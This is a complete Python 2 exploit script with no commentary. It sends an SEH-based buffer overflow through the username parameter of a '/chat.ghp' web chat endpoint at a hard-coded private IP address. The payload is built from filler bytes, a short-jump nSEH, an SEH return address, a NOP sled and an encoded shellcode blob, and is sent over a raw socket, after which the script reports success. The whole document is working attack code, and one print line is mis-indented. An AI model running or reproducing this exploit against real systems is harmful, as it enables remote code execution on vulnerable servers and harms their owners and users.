#!/usr/bin/python2

import socket
import sys

host = "192.168.70.142"
port = 80 

crash = "A" * 216
nseh = "\xeb\x06\x90\x90"
seh = "\x94\x8c\x01\x10"
nops_sled = "\x90" * 20
shellcode = (
"\xdb\xd5\xb8\x25\x63\xc9\xd7\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x31\x31\x45\x18\x83\xed\xfc\x03\x45\x31\x81\x3c\x2b"
"\xd1\xc7\xbf\xd4\x21\xa8\x36\x31\x10\xe8\x2d\x31\x02\xd8"
"\x26\x17\xae\x93\x6b\x8c\x25\xd1\xa3\xa3\x8e\x5c\x92\x8a"
"\x0f\xcc\xe6\x8d\x93\x0f\x3b\x6e\xaa\xdf\x4e\x6f\xeb\x02"
"\xa2\x3d\xa4\x49\x11\xd2\xc1\x04\xaa\x59\x99\x89\xaa\xbe"
"\x69\xab\x9b\x10\xe2\xf2\x3b\x92\x27\x8f\x75\x8c\x24\xaa"
"\xcc\x27\x9e\x40\xcf\xe1\xef\xa9\x7c\xcc\xc0\x5b\x7c\x08"
"\xe6\x83\x0b\x60\x15\x39\x0c\xb7\x64\xe5\x99\x2c\xce\x6e"
"\x39\x89\xef\xa3\xdc\x5a\xe3\x08\xaa\x05\xe7\x8f\x7f\x3e"
"\x13\x1b\x7e\x91\x92\x5f\xa5\x35\xff\x04\xc4\x6c\xa5\xeb"
"\xf9\x6f\x06\x53\x5c\xfb\xaa\x80\xed\xa6\xa0\x57\x63\xdd"
"\x86\x58\x7b\xde\xb6\x30\x4a\x55\x59\x46\x53\xbc\x1e\xb8"
"\x19\x9d\x36\x51\xc4\x77\x0b\x3c\xf7\xad\x4f\x39\x74\x44"
"\x2f\xbe\x64\x2d\x2a\xfa\x22\xdd\x46\x93\xc6\xe1\xf5\x94"
"\xc2\x81\x98\x06\x8e\x6b\x3f\xaf\x35\x74"
)
padding = "B" * 200

payload = crash + nseh + seh + nops_sled + shellcode + padding

buffer = "GET /chat.ghp?username=" + payload + "&password=admin&room=1&sex=2 HTTP/1.1\r\n"
buffer += "Host: 192.168.70.142\r\n\r\n"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(bytes(buffer + "\r\n\r\n"))
  print(" Exploited Successfully.")
	s.close()
except:
	print("Host is Unreachable")
	sys.exit()
